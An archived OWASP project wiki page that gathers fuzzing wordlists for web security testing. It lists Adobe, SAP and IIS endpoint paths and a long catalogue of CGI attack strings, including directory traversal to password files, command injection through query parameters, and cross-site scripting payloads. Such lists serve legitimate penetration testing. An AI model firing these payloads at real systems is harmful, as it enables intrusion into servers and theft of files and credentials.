<table>
<thead>
<tr class="header">
<th><p>width="700" align="center"</p></th>
<th><p><br />
</p></th>
<th><p>width="500" align="center"</p></th>
<th><p><br />
</p></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><p>align="right"</p></td>
<td><figure>
<img src="OWASP_Inactive_Banner.jpg" title="OWASP_Inactive_Banner.jpg" alt="OWASP_Inactive_Banner.jpg" width="800" /><figcaption>OWASP_Inactive_Banner.jpg</figcaption>
</figure></td>
<td><p>align="right"</p></td>
<td></td>
</tr>
</tbody>
</table>

This database is a collection of several statements used in code
injection, fuzzing and brute-force aproach. All too often security
professionals rely on their own repositories of statements collected
from assessments they've conducted. These repositories are prone to
being incomplete or outdated. We want to collect all these statements,
merging the statements from several projects like
[WebScarab](WebScarab "wikilink"), [WebSlayer](WebSlayer "wikilink") and
[JBroFuzz](JBroFuzz "wikilink") with member contributions to build a
comprehensive dataset of effective statements to provide better testing
results. Please add your own statements and check out the statements
already added.

#### News

**10 November 2011**

  - Update Category: SAP Common URL Web Interfaces (10 November 2011 -
    Total Statements: 155)

**08 November 2010**

  - Created new Category: Adobe XML Files (08 November 2010 - Total
    Statements: 16)

**15 September 2010**

  - Created new Category: SAP Common URL Web Interfaces (15 September
    2010 - Total Statements: 6)

**17 March 2010**

  - Created new Category: Vulnerable Cross-Platform CGI (17 March 2010 -
    Total Statements: 563)
  - Created new Category: Windows Directory Traversal (Update: 17 March
    2010 - Total Statements: 16)
  - Created new Category: Generic 8 Directory Deep Traversal Fuzz (17
    March 2010 - Total Statements: 879)
  - Created new Category: Common Windows CGI (Update: 17 March 2010 -
    Total Statements: 76)
  - Created new Category: File Upload Filter Bypass (Update: 17 March
    2010 - Total Statements: 4)
  - Created new Category: Cross-Platform File Upload Filter Bypass -
    Filename Appends (Update: 17 March 2010 - Total Statements: 2)
  - Created new Category: Cross-Platform File Upload Filter Bypass -
    Filename Appends (Update: 17 March 2010 - Total Statements: 7)
  - Created new Category: Microsoft-Specific Cross-Platform File Upload
    Filter Bypass - Filename Appends (Update: 17 March 2010 - Total
    Statements: 14)
  - Created new Category: Commonly Writable directories File Upload
    Filter Bypass - Filename Appends (Update: 17 March 2010 - Total
    Statements: 9)

**16 March 2010**

  - Created new Category: Common Data File Extensions (Update: 16 March
    2010 - Total Statements: 863)
  - Created new Category: Uncommon Data File Extensions (Update: 16
    March 2010 - Total Statements: 284)
  - Created new Category: Cold Fusion Default Files - (Update: 16 March
    2010 - Total Statements: 65)
  - Created new Category: All HTTP Verbs Defined in RFC's + 1 ARBITRARY
    Verb - (Update: 16 March 2010 - Total Statements: 31)

**02 February 2010**

  - Created new Category Lotus/Notes Files

**11 August 2009**

  - Created new Category: XML Attacks

*Update Statements*

  - 15 new XML Statements
  - 93 new SQL Injections Statements
  - 67 new Traversal Directory Statements
  - Delete 33 XSS Statement Duplicate
  - 30 New XSS Statements

**7 August 2009**

  - Updated the objectives of the project.

**21 July 2009**

  - Set the team responsible for the project.

#### Goals

This project intend to create a database that concentrate all tools
which are based on wordlists such as Webscarab, JBroFuzz, Web Slayer ,
Dirbuster. and others. In addition to current tools developed by OWASP
members we will create a database following a style similar to Open
Vulnerability and Assessment Language (OVAL) where any tool can adopt
and use a XML file maintained by OWASP.

In addition, the following functionalities will be included on this
project:

1 - The statements of ASDR Project 2 - Browser 3 - Operational System 4
- Databases

An URL will also be published to create an collaborative environment for
the maintenance process where the following features are planned:

1 - Deploy a process where a new statement can be suggested and
registered if is not valid yet and not maintained in other database.

2 - A list where besides the statement, a single id will be maintained
to identify each statement with a description and the results of the
exploitation.

3 - Possibility to support users on the report of their own experiences
with the statements.

#### Statements

### Adobe XML Files (08 November 2010)

    /flex2gateway/
    /flex2gateway/http
    /flex2gateway/httpsecure
    /flex2gateway/cfamfpoolling
    /flex2gateway/amf
    /flex2gateway/amfpolling
    /messagebroker/http
    /messagebroker/httpsecure
    /blazeds/messagebroker/http
    /blazeds/messagebroker/httpsecure
    /samples/messagebroker/http
    /samples/messagebroker/httpsecure
    /lcds/messagebroker/http
    /lcds/messagebroker/httpsecure
    /lcds-samples/messagebroker/http
    /lcds-samples/messagebroker/httpsecure

### SAP Commom URL Web Interface (10 November 2011)

    /rep/build_info.html
    /rep/build_info.jsp
    /run/build_info.html
    /run/build_info.jsp
    /rwb/version.html
    /sap/bc/bsp/esh_os_service/favicon.gif
    /sap/bc/bsp/sap
    /sap/bc/bsp/sap/alertinbox
    /sap/bc/bsp/sap/bsp_dlc_frcmp
    /sap/bc/bsp/sap/bsp_veri
    /sap/bc/bsp/sap/bsp_verificatio
    /sap/bc/bsp/sap/bsp_wd_base
    /sap/bc/bsp/sap/bspwd_basics
    /sap/bc/bsp/sap/certmap
    /sap/bc/bsp/sap/certreq
    /sap/bc/bsp/sap/crm_bsp_frame
    /sap/bc/bsp/sap/crmcmp_bpident/
    /sap/bc/bsp/sap/crmcmp_brfcase
    /sap/bc/bsp/sap/crmcmp_hdr
    /sap/bc/bsp/sap/crmcmp_hdr_std
    /sap/bc/bsp/sap/crmcmp_ic_frame
    /sap/bc/bsp/sap/crm_thtmlb_util
    /sap/bc/bsp/sap/crm_ui_frame
    /sap/bc/bsp/sap/crm_ui_start
    /sap/bc/bsp/sap/esh_sap_link
    /sap/bc/bsp/sap/esh_sapgui_exe
    /sap/bc/bsp/sap/graph_bsp_test
    /sap/bc/bsp/sap/graph_bsp_test/Mimes
    /sap/bc/bsp/sap/gsbirp
    /sap/bc/bsp/sap/htmlb_samples
    /sap/bc/bsp/sap/iccmp_bp_cnfirm
    /sap/bc/bsp/sap/iccmp_hdr_cntnr
    /sap/bc/bsp/sap/iccmp_hdr_cntnt
    /sap/bc/bsp/sap/iccmp_header
    /sap/bc/bsp/sap/iccmp_ssc_ll/
    /sap/bc/bsp/sap/ic_frw_notify
    /sap/bc/bsp/sap/it00
    /sap/bc/bsp/sap/public/bc
    /sap/bc/bsp/sap/public/graphics
    /sap/bc/bsp/sap/sam_demo
    /sap/bc/bsp/sap/sam_notifying
    /sap/bc/bsp/sap/sam_sess_queue
    /sap/bc/bsp/sap/sbspext_htmlb
    /sap/bc/bsp/sap/sbspext_xhtmlb
    /sap/bc/bsp/sap/spi_admin
    /sap/bc/bsp/sap/spi_monitor
    /sap/bc/bsp/sap/sxms_alertrules
    /sap/bc/bsp/sap/system
    /sap/bc/bsp/sap/thtmlb_scripts
    /sap/bc/bsp/sap/thtmlb_styles
    /sap/bc/bsp/sap/uicmp_ltx
    /sap/bc/bsp/sap/xmb_bsp_log
    /sap/bc/contentserver
    /sap/bc/echo
    /sap/bc/error
    /sap/bc/FormToRfc
    /sap/bc/graphics/net
    /sap/bc/gui/sap/its/CERTREQ
    /sap/bc/gui/sap/its/designs
    /sap/bc/gui/sap/its/webgui
    /sap/bc/IDoc_XML
    /sap/bc/ping
    /sap/bc/report
    /sap/bc/soap/ici
    /sap/bc/soap/rfc
    /sap/bc/srt/IDoc
    /sap/bc/wdvd
    /sap/bc/webdynpro/sap/apb_launchpad
    /sap/bc/webdynpro/sap/apb_launchpad_nwbc
    /sap/bc/webdynpro/sap/apb_lpd_light_start
    /sap/bc/webdynpro/sap/apb_lpd_start_url
    /sap/bc/webdynpro/sap/application_exit
    /sap/bc/webdynpro/sap/appl_log_trc_viewer
    /sap/bc/webdynpro/sap/appl_soap_management
    /sap/bc/webdynpro/sap/ccmsbi_wast_extr_testenv
    /sap/bc/webdynpro/sap/cnp_light_test
    /sap/bc/webdynpro/sap/configure_application
    /sap/bc/webdynpro/sap/configure_component
    /sap/bc/webdynpro/sap/esh_search_results.ui
    /sap/bc/webdynpro/sap/esh_adm_smoketest_ui
    /sap/bc/webdynpro/sap/sh_adm_smoketest_files
    /sap/bc/webdynpro/sap/esh_eng_modelling
    /sap/bc/webdynpro/sap/esh_admin_ui_component
    /sap/bc/webdynpro/sap/wdhc_application
    /sap/bc/webdynpro/sap/wd_analyze_config_appl
    /sap/bc/webdynpro/sap/wd_analyze_config_comp
    /sap/bc/webdynpro/sap/wd_analyze_config_user
    /sap/bc/webdynpro/sap/WDR_TEST_ADOBE
    /sap/bc/webdynpro/sap/WDR_TEST_EVENTS
    /sap/bc/webdynpro/sap/wdr_test_popups_rt
    /sap/bc/webdynpro/sap/WDR_TEST_TABLE
    /sap/bc/webdynpro/sap/wdr_test_ui_elements
    /sap/bc/webdynpro/sap/WDR_TEST_WINDOW_ERROR
    /sap/bc/webrfc
    /sap/bc/xrfc
    /sap/bc/xrfc_test
    /sap/es/cockpit
    /sap/es/getdocument
    /sap/es/opensearch
    /sap/es/opensearch/description
    /sap/es/opensearch/list
    /sap/es/opensearch/search
    /sap/es/saplink
    /sap/es/search
    /sap/es/redirect
    /sap/crm
    /sap/public/bc
    /sap/public/bc/icons
    /sap/public/bc/icons_rtl
    /sap/public/bc/its/mimes
    /sap/public/bc/its/mimes/system/SL/page/hourglass.html
    /sap/public/bc/its/mobile/itsmobile00
    /sap/public/bc/its/mobile/itsmobile01
    /sap/public/bc/its/mobile/rfid
    /sap/public/bc/its/mobile/start
    /sap/public/bc/its/mobile/test
    /sap/public/bc/NWDEMO_MODEL
    /sap/public/bc/NW_ESH_TST_AUTO
    /sap/public/bc/pictograms
    /sap/public/bc/sicf_login_run
    /sap/public/bc/trex
    /sap/public/bc/ur
    /sap/public/bc/wdtracetool
    /sap/public/bc/webdynpro/adobechallenge
    /sap/public/bc/webdynpro/mimes
    /sap/public/bc/webdynpro/ssr
    /sap/public/bc/webdynpro/viewdesigner
    /sap/public/bc/webicons
    /sap/public/bc/workflow
    /sap/public/bc/workflow/shortcut
    /sap/public/bsp/sap
    /sap/public/bsp/sap/htmlb
    /sap/public/bsp/sap/public
    /sap/public/bsp/sap/public/bc
    /sap/public/bsp/sap/public/faa
    /sap/public/bsp/sap/public/graphics
    /sap/public/bsp/sap/public/graphics/jnet_handler
    /sap/public/bsp/sap/public/graphics/mimes
    /sap/public/bsp/sap/system
    /sap/public/bsp/sap/system_public
    /sap/public/icf_check
    /sap/public/icf_info
    /sap/public/icf_info/icr_groups
    /sap/public/icf_info/icr_urlprefix
    /sap/public/icf_info/logon_groups
    /sap/public/icf_info/urlprefix
    /sap/public/icman
    /sap/public/info
    /sap/public/myssocntl
    /sap/public/ping
    /sap/webcuif
    /sap/public/icman/ping
    /sap/admin
    /sap/wdisp/admin
    /scripts/wgate

### Microsoft URLs (8 April 2010)

    # Interesting IIS Files & Directories (8 April 2010)
    # adam.muntner@quietmove.com
    # creative commons
    # Look at the result codes in the headers - 403 likely mean the dir exists, 404  means not. It takes an ISAPI filter for IIS to return 404's for 403s.
    # Altetrnatively, slight differences in the number of bytes returned will help differentiate.

    /.printer
    /%NETHOOD%/
    /<script>alert('XSS')</script>.aspx
    /AccessPlatform/
    /AccessPlatform/auth/
    /AccessPlatform/auth/clientscripts/cookies.js
    /AccessPlatform/auth/clientscripts/login.js
    /Exadmin/
    /ExchWeb/
    /Exchange/
    /Microsoft-Server-ActiveSync/
    /OMA/
    /OWA/
    /Public/
    /_layouts/alllibs.htm
    /_layouts/settings.htm
    /_layouts/userinfo.htm
    /_vti_bin/
    /_vti_bin/_vti_aut/fp30reg.dll
    /_vti_pvt/
    /_WEB_INF/
    /a%5c.aspx
    /adovbs.inc
    /aspnet_files/
    /certcontrol/
    /certenroll/
    /certsrv/
    /citrix/
    /citrix/AccessPlatform/auth/
    /citrix/AccessPlatform/auth/clientscripts/
    /AccessPlatform/auth/clientscripts/
    /Citrix//AccessPlatform/auth/clientscripts/cookies.js
    /Citrix/AccessPlatform/auth/clientscripts/login.js
    /Citrix/PNAgent/config.xml
    /exchange/root.asp
    /forum.asp
    /forum_arc.asp
    /forum_professionnel.asp
    /iisadmin/
    /iisadmpwd/achg.htr
    /iisadmpwd/aexp.htr
    /iisadmpwd/aexp2.htr
    /iisadmpwd/aexp2b.htr
    /iisadmpwd/aexp3.htr
    /iisadmpwd/aexp4.htr
    /iisadmpwd/aexp4b.htr
    /iisadmpwd/anot.htr
    /iisadmpwd/anot3.htr
    /iiasdmpwd/
    /iishelp/
    /iishelp/iis/misc/default.asp
    /iissamples/
    /imprimer.asp
    /includes/adovbs.inc
    /msadc/
    /null.htw
    /pbserver/pbserver.dll
    /postinfo.html
    /rubrique.asp
    /scripts/
    /scripts/fpcount.exe
    /scripts/cgimail.exe
    /scripts/tools/newdsn.exe
    /scripts/tools/getdrvs.exe
    /scripts/convert.bas
    /cgi-bin/htmlscript
    /scripts/counter.exe
    /scripts/no-such-file.pl
    /share/
    /tsweb/
    /~/<script>alert('XSS')</script>.asp
    /~/<script>alert('XSS')</script>.aspx
    /index.shtml
    /x.htw
    /x.ida
    /x.idq
    /cgi
    /scripts/iisadmin/ism.dll?http/dir
    /scripts/samples/search/webhits.exe

### Vulnerable Cross-Platform CGI (17 March 2010 - Total Statements: 563)

    # Vulnerable Cross-Platform CGI (17 March 2010)
    # fuzz inside cgi directories
    # on windows, this is usually /scripts or /bin or /cgi-bin, on unix, usually /cgi-bin, /nph-cgi
    # adam.muntner@quietmove.com

    %2e%2e/abyss.conf
    .access
    .cobalt
    .cobalt/alert/service.cgi?service=<img%20src=javascript:alert('XSS')>
    .cobalt/alert/service.cgi?service=<script>alert('XSS')</script>
    .fhp
    .htaccess
    .htaccess.old
    .htaccess.save
    .htaccess~
    .htpasswd
    .nsconfig
    .passwd
    .www_acl
    .wwwacl
    /_vti_pvt/doctodep.btr
    14all-1.1.cgi?cfg=../../../../../../../..{KNOWNFILE}
    14all.cgi?cfg=../../../../../../../..{KNOWNFILE}
    AT-admin.cgi
    AT-generate.cgi
    Album?mode=album&album=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc&dispsize=640&start=0
    AnyBoard.cgi
    AnyForm
    AnyForm2
    Backup/add-passwd.cgi
    C
    Count.cgi
    DC
    DCFORM
    File
    FormHandler.cgi?realname=aaa&email=aaa&reply_message_template=%2Fetc%2Fpasswd&reply_message_from=sq%40example.com&redirect=http%3A%2F%2Fwww.example.com&recipient=sq%40example.com
    FormMail.cgi?<script>alert(\
    FormMail.pl
    ImageFolio/admin/admin.cgi
    LWGate
    LWGate.cgi
    Upload.pl
    Vs
    W
    YaBB.pl?board=news&action=display&num=../../../../../../../../../..{KNOWNFILE}%00
    YaBB/YaBB.cgi?board=BOARD&action=display&num=<script>alert('XSS')</script>
    a1disp3.cgi?../../../../../../../../../..{KNOWNFILE}
    a1stats/a1disp3.cgi?../../../../../../../../../..{KNOWNFILE}
    a1stats/a1disp3.cgi?../../../../../../..{KNOWNFILE}
    a1stats/a1disp4.cgi?../../../../../../..{KNOWNFILE}
    add_ftp.cgi
    addbanner.cgi
    adduser.cgi
    admin.cgi
    admin.cgi?list=../../../../../../../../../..{KNOWNFILE}
    admin.php
    admin.php3
    admin.pl
    adminhot.cgi
    adminwww.cgi
    af.cgi?_browser_out=.
    |.%2F.
    |.%2F.
    |.%2F.
    |.%2F.
    |.%2F.
    |.%2F.
    |.%2F.
    |.%2F.
    |.%2F.
    |.%2F.
    |.%2F.
    |.%2Fetc%2Fpasswd
    aglimpse
    aglimpse.cgi
    alibaba.pl
    |dir%20..\\..\\..\\..\\..\\..\\..\\,
    alienform.cgi?_browser_out=.
    |.%2F.
    |.%2F.
    |.%2F.
    |.%2F.
    |.%2F.
    |.%2F.
    |.%2F.
    |.%2F.
    |.%2F.
    |.%2F.
    |.%2F.
    |.%2Fetc%2Fpasswd
    amadmin.pl
    anacondaclip.pl?template=../../../../../../../../../..{KNOWNFILE}
    ans.pl?p=../../../../../usr/bin/id
    |&blah
    ans/ans.pl?p=../../../../../usr/bin/id
    |&blah
    anyboard.cgi
    archie
    architext_query.cgi
    architext_query.pl
    ash
    astrocam.cgi
    atk/javascript/class.atkdateattribute.js.php?config_atkroot=@RFIURL
    auction/auction.cgi?action=
    auctiondeluxe/auction.pl
    auktion.cgi?menue=../../../../../../../../../..{KNOWNFILE}
    auth_data/auth_user_file.txt
    awl/auctionweaver.pl
    awstats.pl
    awstats/awstats.pl
    ax-admin.cgi
    ax.cgi
    axs.cgi
    badmin.cgi
    banner.cgi
    bannereditor.cgi
    bash
    bb-hist?HI
    bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK
    bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK
    bbs_forum.cgi
    betsie/parserl.pl/<script>alert('XSS')</script>;
    bigconf.cgi?command=view_textfile&file={KNOWNFILE}&filters=
    bizdb1-search.cgi
    blog/
    blog/mt-check.cgi
    blog/mt-load.cgi
    blog/mt.cfg
    bnbform
    bnbform.cgi
    book.cgi?action=default&current=
    |cat%20{KNOWNFILE}
    |&form_tid=996604045&prev=main.html&list_message_index=10
    boozt/admin/index.cgi?section=5&input=1
    bsguest.cgi?email=x;ls
    bslist.cgi?email=x;ls
    build.cgi
    bulk/bulk.cgi
    c_download.cgi
    cached_feed.cgi
    cachemgr.cgi
    cal_make.pl?p0=../../../../../../../../../..{KNOWNFILE}%00
    calendar
    calendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22
    calendar.pl
    calendar/calendar_admin.pl?config=
    |cat%20{KNOWNFILE}
    |
    calendar/index.cgi
    calendar_admin.pl?config=
    |cat%20{KNOWNFILE}
    |
    calender_admin.pl
    campas?%0acat%0a{KNOWNFILE}%0a
    cart.pl
    cart.pl?db='
    cartmanager.cgi
    cbmc/forums.cgi
    ccbill-local.cgi?cmd=MENU
    ccbill-local.pl?cmd=MENU
    cgforum.cgi
    cgi-lib.pl
    cgicso?query=<script>alert('XSS')</script>
    cgicso?query=AAA
    cgiforum.pl?thesection=../../../../../../../../../..{KNOWNFILE}%00
    cgiwrap
    cgiwrap/%3Cfont%20color=red%3E
    cgiwrap/~@U
    cgiwrap/~JUNK(5)
    cgiwrap/~root
    change-your-password.pl
    classified.cgi
    classifieds
    classifieds.cgi
    classifieds/classifieds.cgi
    classifieds/index.cgi
    clickcount.pl?view=test
    clickresponder.pl
    code.php
    code.php3
    com5..........................................................................................................................................................................................................................box
    com5.java
    com5.pl
    commandit.cgi
    commerce.cgi?page=../../../../../../../../../..{KNOWNFILE}%00index.html
    common.php?f=0&ForumLang=../../../../../../../../../..{KNOWNFILE}
    common/listrec.pl
    common/listrec.pl?APP=qmh-news&TEMPLATE=;ls%20/etc
    |
    compatible.cgi
    count.cgi
    counter-ord
    counterbanner
    counterbanner-ord
    counterfiglet-ord
    counterfiglet/nc/
    cs
    csChatRBox.cgi?command=savesetup&setup=;system('cat%20{KNOWNFILE}')
    csGuestBook.cgi?command=savesetup&setup=;system('cat%20{KNOWNFILE}')
    csLive
    csNews.cgi
    csNewsPro.cgi?command=savesetup&setup=;system('cat%20{KNOWNFILE}')
    csPassword.cgi
    csPassword/csPassword.cgi
    csh
    cstat.pl
    cutecast/members/
    cvsblame.cgi?file=<script>alert('XSS')</script>
    cvslog.cgi?file=*&rev=&root=<script>alert('XSS')</script>
    cvslog.cgi?file=<script>alert('XSS')</script>
    cvsquery.cgi?branch=<script>alert('XSS')</script>&file=<script>alert(document.domain)</script>&date=<script>alert(document.domain)</script>
    cvsquery.cgi?module=<script>alert('XSS')</script>&branch=&dir=&file=&who=<script>alert(document.domain)</script>&sortby=Date&hours=2&date=week
    cvsqueryform.cgi?cvsroot=/cvsroot&module=<script>alert('XSS')</script>&branch=HEAD
    dansguardian.pl?DENIEDURL=</a><script>alert('XSS');</script>
    dasp/fm_shell.asp
    data/fetch.php?page=
    date
    day5datacopier.cgi
    day5datanotifier.cgi
    db2www/library/document.d2w/show
    db4web_c/dbdirname/{KNOWNFILE}
    db_manager.cgi
    dbman/db.cgi?db=no-db
    dcforum.cgi?az=list&forum=../../../../../../../../../..{KNOWNFILE}%00
    dcshop/auth_data/auth_user_file.txt
    dcshop/orders/orders.txt
    dfire.cgi
    diagnose.cgi
    dig.cgi
    directorypro.cgi?want=showcat&show=../../../../../../../../../..{KNOWNFILE}%00
    displayTC.pl
    dnewsweb
    donothing
    dose.pl?daily&somefile.txt&
    |ls
    |
    download.cgi
    dumpenv.pl
    edit.pl
    empower?DB=whateverwhatever
    emu/html/emumail.cgi?type=/../../../../../../../../../../../../../../../..{KNOWNFILE}%00
    emumail.cgi?type=/../../../../../../../../../../../../../../../..{KNOWNFILE}%00
    emumail/emumail.cgi?type=/../../../../../../../../../../../../../../../..{KNOWNFILE}%00
    enter.cgi
    environ.cgi
    environ.pl
    environ.pl?param1=<script>alert(document.cookie)</script>
    erba/start/%3Cscript%3Ealert('XSS');%3C/script%3E
    eshop.pl/seite=;cat%20eshop.pl
    |
    ex-logger.pl
    excite
    excite;IF
    ezadmin.cgi
    ezboard.cgi
    ezman.cgi
    ezshopper/loadpage.cgi?user_id=1&file=
    |cat%20{KNOWNFILE}
    |
    ezshopper/search.cgi?user_id=id&database=dbase1.exm&template=../../../../../../..{KNOWNFILE}&distinct=1
    ezshopper2/loadpage.cgi
    ezshopper3/loadpage.cgi
    faqmanager.cgi?toc={KNOWNFILE}%00
    faxsurvey?cat%20{KNOWNFILE}
    filemail
    filemail.pl
    finger
    finger.pl
    flexform
    flexform.cgi
    fom.cgi?file=<script>alert('XSS')</script>
    fom/fom.cgi?cmd=<script>alert('XSS')</script>&file=1&keywords=vulnerable
    formmail
    formmail.cgi
    formmail.cgi?recipient=root@localhost%0Acat%20{KNOWNFILE}&email=joeuser@localhost&subject=test
    formmail.pl
    formmail.pl?recipient=root@localhost%0Acat%20{KNOWNFILE}&email=joeuser@localhost&subject=test
    formmail?recipient=root@localhost%0Acat%20{KNOWNFILE}&email=joeuser@localhost&subject=test
    fortune
    ftp.pl
    ftpsh
    gH.cgi
    gbadmin.cgi?action=change_adminpass
    gbadmin.cgi?action=change_automail
    gbadmin.cgi?action=colors
    gbadmin.cgi?action=setup
    gbook/gbook.cgi?_MAILTO=xx;ls
    gbpass.pl
    generate.cgi?content=../../../../../../../../../../windows/win.ini%00board=board_1
    generate.cgi?content=../../../../../../../../../../winnt/win.ini%00board=board_1
    generate.cgi?content=../../../../../../../../../..{KNOWNFILE}%00board=board_1
    getdoc.cgi
    gettransbitmap
    glimpse
    gm-authors.cgi
    gm-cplog.cgi
    gm.cgi
    guestbook.cgi
    guestbook.cgi?user=cpanel&template=
    |/bin/cat%20{KNOWNFILE}
    |
    guestbook.pl
    guestbook/passwd
    handler.cgi
    hitview.cgi
    horde/test.php
    horde/test.php?mode=phpinfo
    hsx.cgi?show=../../../../../../../../../../..{KNOWNFILE}%00
    htgrep?file=index.html&hdr={KNOWNFILE}
    html2chtml.cgi
    html2wml.cgi
    htmlscript?../../../../../../../../../..{KNOWNFILE}
    htsearch.cgi?words=%22%3E%3Cscript%3Ealert%'XSS'%29%3B%3C%2Fscript%3E
    htsearch?-c/nonexistant
    htsearch?config=foofighter&restrict=&exclude=&method=and&format=builtin-long&sort=score&words=
    htsearch?exclude=%60{KNOWNFILE}%60
    ibill.pm
    icat
    if/admin/nph-build.cgi
    ikonboard/help.cgi?
    imageFolio.cgi
    imagefolio/admin/admin.cgi
    imagemap
    include/new-visitor.inc.php
    index.js0x70
    index.pl
    info2www
    info2www '(../../../../../../../bin/mail root <{KNOWNFILE}>
    infosrch.cgi
    ion-p?page=../../../../..{KNOWNFILE}
    jailshell
    jj
    journal.cgi?folder=journal.cgi%00
    ksh
    lastlines.cgi?process
    listrec.pl
    loadpage.cgi?user_id=1&file=../../../../../../../../../..{KNOWNFILE}
    loadpage.cgi?user_id=1&file=..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini
    log-reader.cgi
    log/
    log/nether-log.pl?checkit
    login.cgi
    login.pl
    login.pl?course_id=\
    logit.cgi
    logs.pl
    logs/
    logs/access_log
    logs/error_log
    lookwho.cgi
    ls
    lwgate
    lwgate.cgi
    magiccard.cgi?pa=3Dpreview&next=3Dcustom&page=3D../../../../../../../../../..{KNOWNFILE}
    mail
    mail/emumail.cgi?type=/../../../../../../../../../../../../../../../..{KNOWNFILE}%00
    mail/nph-mr.cgi?do=loginhelp&configLanguage=../../../../../../..{KNOWNFILE}%00
    mailit.pl
    maillist.cgi
    maillist.pl
    mailnews.cgi
    main.cgi?board=FREE_BOARD&command=down_load&filename=../../../../../../../../../..{KNOWNFILE}
    majordomo.pl
    man2html
    mastergate/search.cgi?search=0&search_on=all
    meta.pl
    mgrqcgi
    mini_logger.cgi
    mmstdod.cgi
    moin.cgi?test
    mojo/mojo.cgi
    mrtg.cfg?cfg=../../../../../../../..{KNOWNFILE}
    mrtg.cgi?cfg=../../../../../../../..{KNOWNFILE}
    mrtg.cgi?cfg=blah
    ms_proxy_auth_query/
    mt-static/
    mt-static/mt-check.cgi
    mt-static/mt-load.cgi
    mt-static/mt.cfg
    mt/
    mt/mt-check.cgi
    mt/mt-load.cgi
    mt/mt.cfg
    multihtml.pl?multi={KNOWNFILE}%00html
    musicqueue.cgi
    myguestbook.cgi?action=view
    namazu.cgi
    nbmember.cgi?cmd=list_all_users
    netauth.cgi?cmd=show&page=../../../../../../../../../..{KNOWNFILE}
    netpad.cgi
    newsdesk.cgi?t=../../../../../../../../../..{KNOWNFILE}
    nimages.php
    nlog-smb.cgi
    nlog-smb.pl
    non-existent.pl
    noshell
    nph-emumail.cgi?type=/../../../../../../../../../../../../../../../..{KNOWNFILE}%00
    nph-error.pl
    nph-exploitscanget.cgi
    nph-maillist.pl
    nph-publish
    nph-publish.cgi
    nph-showlogs.pl?files=../../&filter=.*&submit=Go&linecnt=500&refresh=0
    nph-test-cgi
    ntitar.pl
    opendir.php?{KNOWNFILE}
    orders/orders.txt
    pagelog.cgi
    pals-cgi?palsAction=restart&documentName={KNOWNFILE}
    parse-file
    pass
    passwd
    passwd.txt
    password
    pbcgi.cgi?name=Joe%Camel&email=%3C
    perl
    perl?-v
    perlshop.cgi
    pfdispaly.cgi?'%0A/bin/cat%20{KNOWNFILE}
    |'
    pfdispaly.cgi?../../../../../../../../../..{KNOWNFILE}
    pfdisplay.cgi?'%0A/bin/cat%20{KNOWNFILE}
    |'
    phf
    phf.cgi?QALIA
    phf?Qname=root%0Acat%20{KNOWNFILE}%20
    photo/
    photo/manage.cgi
    photo/protected/manage.cgi
    php-cgi
    php.cgi?{KNOWNFILE}
    plusmail
    pollit/Poll_It_
    pollssi.cgi
    post-query
    post_query
    postcards.cgi
    powerup/r.cgi?FILE=../../../../../../../../../..{KNOWNFILE}
    printenv
    printenv.tmp
    probecontrol.cgi?command=enable&username=cancer&password=killer
    processit.pl
    profile.cgi
    pu3.pl
    publisher/search.cgi?dir=jobs&template=;cat%20{KNOWNFILE}
    |&output_number=10
    query
    query?mss=%2e%2e/config
    quickstore.cgi?page=../../../../../../../../../..{KNOWNFILE}%00html&cart_id=
    quikstore.cfg
    quizme.cgi
    r.cgi?FILE=../../../../../../../../../..{KNOWNFILE}
    ratlog.cgi
    redirect
    register.cgi
    replicator/webpage.cgi/
    responder.cgi
    retrieve_password.pl
    rksh
    rmp_query
    robadmin.cgi
    robpoll.cgi
    rpm_query
    rsh
    rtm.log
    rwcgi60
    rwcgi60/showenv
    rwwwshell.pl
    sawmill5?rfcf+%22{KNOWNFILE}%22+spbn+1,1,21,1,1,1,1
    sawmill?rfcf+%22
    sbcgi/sitebuilder.cgi
    scoadminreg.cgi
    scripts/*%0a.pl
    search.cgi
    search.cgi?..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini
    search.cgi?..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini
    search.php?searchstring=<script>alert(document.cookie)</script>
    search.pl
    search.pl?Realm=All&Match=0&Terms=test&nocpp=1&maxhits=10&;Rank=<script>alert('XSS')</script>
    search.pl?form=../../../../../../../../../..{KNOWNFILE}%00
    search/search.cgi?keys=*&prc=any&catigory=../../../../../../../../../../../../etc
    sendform.cgi
    sendpage.pl?message=test\;/bin/ls%20/etc;echo%20\message
    sendtemp.pl?templ=../../../../../../../../../..{KNOWNFILE}
    session/adminlogin
    sewse?/home/httpd/html/sewse/jabber/comment2.jse+{KNOWNFILE}
    sh
    shop.cgi?page=../../../../../../..{KNOWNFILE}
    shop.pl/page=;cat%20shop.pl
    |
    shop/auth_data/auth_user_file.txt
    shop/orders/orders.txt
    shopper.cgi?newpage=../../../../../../../../../..{KNOWNFILE}
    shopplus.cgi?dn=domainname.com&cartid=%CARTID%&file=;cat%20{KNOWNFILE}
    |
    show.pl
    showcheckins.cgi?person=<script>alert('XSS')</script>
    showuser.cgi
    simple/view_page?mv_arg=
    |cat%20{KNOWNFILE}
    |
    simplestguest.cgi
    simplestmail.cgi
    smartsearch.cgi?keywords=
    |/bin/cat%20{KNOWNFILE}
    |
    smartsearch/smartsearch.cgi?keywords=
    |/bin/cat%20{KNOWNFILE}
    |
    sojourn.cgi?cat=../../../../../../../../../../etc/password%00
    spin_client.cgi?aaaaaaaa
    ss
    sscd_suncourier.pl
    ssi//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e{KNOWNFILE}
    start.cgi/%3Cscript%3Ealert('XSS');%3C/script%3E
    stat.pl
    stat/
    stats-bin-p/reports/index.html
    stats.pl
    stats.prf
    stats/
    stats/statsbrowse.asp?filepath=c:\&Opt=3
    stats_old/
    statsconfig
    statusconfig.pl
    statview.pl
    store.cgi?
    store/agora.cgi?cart_id=<script>alert('XSS')</script>
    store/agora.cgi?page=whatever33.html
    store/index.cgi?page=../../../../../../../..{KNOWNFILE}
    story.pl?next=../../../../../../../../../..{KNOWNFILE}%00
